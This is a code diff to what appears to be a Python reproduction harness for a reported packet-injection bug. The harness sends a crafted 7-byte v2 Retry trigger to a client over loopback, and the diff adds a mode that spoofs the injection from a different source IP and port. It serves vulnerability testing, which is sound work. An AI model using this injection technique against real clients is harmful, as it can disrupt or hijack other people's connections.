@@ -13,6 +13,7 @@ V2 = bytes.fromhex("6b3343cf")
 MODES = {
     "attack-original": (0x80, V2),      # Exact 7-byte trigger from the report.
     "attack-fixedbit": (0xC0, V2),      # Same v2 Retry type, Fixed Bit set.
+    "attack-alt-source": (0x80, V2),    # Send from a different loopback IP/UDP port.
     "control-original": (0x80, V1),     # Original v1 control from the report.
     "control-retry": (0xF0, V1),        # v1 Retry; same early Retry dispatch path.
 }
@@ -70,12 +71,23 @@ def main() -> int:
                         flush=True,
                     )
                     time.sleep(max(args.delay_ms, 0) / 1000.0)
-                    sock.sendto(packet, client)
+                    if args.mode == "attack-alt-source":
+                        # Keep forwarding from the expected server endpoint on
+                        # the main socket, but inject from a different source
+                        # IP and UDP port to test whether the client binds the
+                        # connection exclusively to the authenticated peer tuple.
+                        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as attacker:
+                            attacker.bind(("127.0.0.2", 0))
+                            attack_source = attacker.getsockname()
+                            attacker.sendto(packet, client)
+                    else:
+                        sock.sendto(packet, client)
+                        attack_source = sock.getsockname()
                     injection_marker.write_text(packet.hex(), encoding="ascii")
                     injected = True
                     print(
                         f"INJECTED mode={args.mode} packet={packet.hex()} "
-                        f"client={client}",
+                        f"source={attack_source} client={client}",
                         flush=True,
                     )
             else:
